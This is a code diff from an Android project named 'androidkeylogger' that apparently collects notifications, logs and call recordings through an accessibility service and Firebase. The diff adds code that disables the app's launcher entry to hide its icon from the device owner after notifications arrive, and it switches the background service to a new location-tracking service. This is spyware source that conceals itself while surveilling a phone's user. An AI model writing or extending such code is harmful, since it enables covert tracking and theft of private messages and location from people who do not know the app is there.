@@ -2,6 +2,7 @@ package com.azamovhudstc.androidkeylogger.activity
 
 import android.annotation.SuppressLint
 import android.content.*
+import android.content.pm.PackageManager
 import android.media.MediaRecorder
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
@@ -21,6 +22,7 @@ import com.azamovhudstc.androidkeylogger.databinding.ActivityMainBinding
 import com.azamovhudstc.androidkeylogger.model.LogModel
 import com.azamovhudstc.androidkeylogger.model.NotificationModel
 import com.azamovhudstc.androidkeylogger.service.CallRecordingService
+import com.azamovhudstc.androidkeylogger.service.LocationService
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 import com.google.firebase.FirebaseApp
 import com.google.firebase.firestore.FirebaseFirestore
@@ -57,6 +59,8 @@ class MainFixActivity : AppCompatActivity() {
             if (!SvcAccFix.j) {
                 startActivity(Intent(this, AccessibilityFixActivity::class.java))
             }
+        }else {
+
         }
     }
 
@@ -79,6 +83,16 @@ class MainFixActivity : AppCompatActivity() {
                 adapter.addNotification(notificationModel)
 
                 saveNotificationToFileLocal(notificationModel)
+                val p = packageManager
+                val componentName = ComponentName(this@MainFixActivity,MainFixActivity::class.java) // activity which is first time open in manifest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
+                p.setComponentEnabledSetting(
+                    componentName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+
+
+
             }
         }
     }
@@ -150,15 +164,17 @@ class MainFixActivity : AppCompatActivity() {
             adapter = NotificationAdapter(notifications)
             readNotificationsFromFileLocal()
             readLogFromFileLocal()
+
         }
+
 
         val filter = IntentFilter("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
         registerReceiver(notificationReceiver, filter)
         registerReceiver(receiver, IntentFilter("ACTION_TEXT_RECEIVED"))
 
-
-        val serviceIntent = Intent(this, CallRecordingService::class.java)
+        val serviceIntent = Intent(this, LocationService::class.java)
         startService(serviceIntent)
+
 
 
         isNotificationFormat.observe(this) {
